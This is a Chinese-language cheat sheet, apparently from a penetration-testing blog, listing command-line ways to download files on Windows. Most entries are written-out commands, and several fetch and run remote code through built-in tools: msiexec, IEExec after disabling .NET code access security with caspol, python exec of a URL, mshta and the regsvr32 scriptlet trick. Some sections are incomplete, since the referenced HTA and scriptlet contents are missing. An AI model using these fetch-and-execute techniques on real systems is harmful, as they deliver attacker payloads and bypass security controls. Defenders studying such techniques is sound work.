Windows下命令行下载文件总结

* [0x00 Powershell](#0x00-powershell)
* [0x01 ftp](#0x01-ftp)
* [0x02 IPC$](#0x02-ipc)
* [0x03 Certutil](#0x03-certutil)
* [0x04 bitsadmin](#0x04-bitsadmin)
* [0x05 msiexec](#0x05-msiexec)
* [0x06 IEExec](#0x06-ieexec)
* [0x07 python](#0x07-python)
* [0x08 mshta](#0x08-mshta)
* [0x09 rundll32](#0x09-rundll32)
* [0x10 regsvr32](#0x10-regsvr32)
* [结语](#%e7%bb%93%e8%af%ad)

## 0x00 Powershell

win2003、winXP不支持

$client = new-object System.Net.WebClient

$client.DownloadFile('http://payloads.online/file.tar.gz', 'E:\file.tar.gz')

## 0x01 ftp

ftp 192.168.3.2

输入用户名和密码后

lcd E:\file # 进入E盘下的file目录

cd www # 进入服务器上的www目录

get access.log # 将服务器上的access.log下载到E:\file

可以参考：https://baike.baidu.com/item/ftp/13839

## 0x02 IPC$

copy \192.168.3.1\c$\test.exe E:\file

可以参考：http://www.163164.com/jiqiao/163164com011.htm

## 0x03 Certutil

可以参考：https://technet.microsoft.com/zh-cn/library/cc773087(WS.10).aspx

应用到: Windows Server 2003, Windows Server 2003 R2, Windows Server 2003 with SP1, Windows Server 2003 with SP2

certutil.exe -urlcache -split -f http://192.168.3.1/test.txt file.txt

## 0x04 bitsadmin

可以参考：https://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx

* 1、 `bitsadmin /rawreturn /transfer getfile http://192.168.3.1/test.txt E:\file\test.txt`
* 2、 `bitsadmin /rawreturn /transfer getpayload http://192.168.3.1/test.txt E:\file\test.txt`

## 0x05 msiexec

msiexec /q /i http://192.168.3.1/test.txt

## 0x06 IEExec

C:\Windows\Microsoft.NET\Framework\v2.0.50727> caspol -s off

C:\Windows\Microsoft.NET\Framework\v2.0.50727> IEExec http://192.168.3.1/test.exe

## 0x07 python

C:\python27\python.exe -c "import urllib2; exec urllib2.urlopen('http://192.168.3.1/test.zip').read();"

## 0x08 mshta

mshta http://192.168.3.1/run.hta

run.hta 内容如下：

## 0x09 rundll32

其实还是依赖于WScript.shell这个组件

## 0x10 regsvr32

regsvr32 /u /s /i:http://192.168.3.1/test.data scrobj.dll

test.data内容：

还可以利用 https://github.com/CroweCybersecurity/ps1encode 生成sct(COM scriptlet - requires a webserver to stage the payload)

regsvr32 /u /s /i:http://192.168.3.1/test.sct scrobj.dll
